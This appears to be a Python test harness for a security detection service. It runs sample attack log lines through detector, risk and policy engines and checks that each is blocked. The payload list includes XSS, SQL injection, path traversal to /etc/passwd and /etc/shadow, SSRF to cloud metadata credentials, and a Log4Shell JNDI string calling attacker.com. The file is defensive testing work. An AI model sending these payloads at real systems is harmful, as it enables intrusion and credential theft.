"""
Digital Twin Simulator — virtualized environment with RL-style attack agents.
Verifies that the risk engine fires correct policy responses.
"""

import random
from app.core.logging_config import logger
from app.services.detector import Detector
from app.services.risk_engine import RiskEngine
from app.services.policy_engine import PolicyEngine


# ── Attack Agent Payloads ─────────────────────────────────────────────────────

ATTACK_PAYLOADS: dict[str, list[dict]] = {
    "xss": [
        {
            "name": "Reflected XSS via script tag",
            "log": '<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200"',
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
        {
            "name": "XSS via URL-encoded payload",
            "log": 'GET /index.php?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1',
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
    ],
    "sqli": [
        {
            "name": "Union-based SQL Injection",
            "log": "GET /api/user?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1",
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
        {
            "name": "Time-based Blind SQLi",
            "log": "POST /login username=admin' AND SLEEP(5)-- &password=x",
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
    ],
    "brute_force": [
        {
            "name": "Repeated Failed Logins",
            "log": "\n".join([
                f"2026-03-24 07:{30+i:02d}:00 INFO failed login for user admin from 10.0.0.1"
                for i in range(7)
            ]),
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
    ],
    "lfi": [
        {
            "name": "Path Traversal to /etc/passwd",
            "log": "GET /download?file=../../../etc/passwd HTTP/1.1",
            "expected_action": "blocked",
            "expected_risk": "high",
        },
        {
            "name": "Encoded Path Traversal",
            "log": "GET /view?path=%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1",
            "expected_action": "blocked",
            "expected_risk": "high",
        },
    ],
    "log4shell": [
        {
            "name": "Log4Shell JNDI Injection",
            "log": 'GET / HTTP/1.1\nUser-Agent: ${jndi:ldap://attacker.com/a}',
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
    ],
    "ssrf": [
        {
            "name": "SSRF to AWS Metadata",
            "log": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1",
            "expected_action": "blocked",
            "expected_risk": "critical",
        },
    ],
}


class DigitalTwin:
    """
    Simulates a target environment and runs RL-style attack agents against it.
    Verifies that the real detection + risk + policy stack fires correctly.
    """

    def __init__(self):
        self.detector = Detector()
        self.risk_engine = RiskEngine()
        self.policy_engine = PolicyEngine()

    def simulate(self, attack_types: list[str] | None = None) -> dict:
        """
        Run attack simulations and return verification artifacts.
        If attack_types is None, runs all attack types.
        """
        if attack_types is None or "all" in attack_types:
            attack_types = list(ATTACK_PAYLOADS.keys())

        results = []
        total = 0
        verified = 0

        for attack_type in attack_types:
            payloads = ATTACK_PAYLOADS.get(attack_type, [])
            for payload in payloads:
                total += 1
                result = self._run_payload(attack_type, payload)
                if result["verified"]:
                    verified += 1
                results.append(result)

        logger.info(f"Digital Twin: {verified}/{total} scenarios verified")

        return {
            "total_scenarios": total,
            "verified": verified,
            "failed": total - verified,
            "pass_rate": round((verified / total * 100) if total else 0, 1),
            "simulation_results": results,
        }

    def _run_payload(self, attack_type: str, payload: dict) -> dict:
        """Run a single attack payload through the full detection stack."""
        log_content = payload["log"]

        # Run through the real stack
        findings = self.detector.detect(log_content, input_type="log")
        risk_data = self.risk_engine.calculate(findings)
        policy_result = self.policy_engine.apply(
            content=log_content,
            findings=findings,
            risk_level=risk_data["risk_level"],
        )

        actual_action = policy_result["action"]
        actual_risk = risk_data["risk_level"]

        # Determine if expectations were met
        action_ok = actual_action == payload["expected_action"]
        risk_ok = actual_risk == payload["expected_risk"]
        verified = action_ok and risk_ok

        return {
            "attack_type": attack_type,
            "scenario_name": payload["name"],
            "expected_action": payload["expected_action"],
            "actual_action": actual_action,
            "expected_risk": payload["expected_risk"],
            "actual_risk": actual_risk,
            "findings_count": len(findings),
            "verified": verified,
            "action_match": action_ok,
            "risk_match": risk_ok,
        }
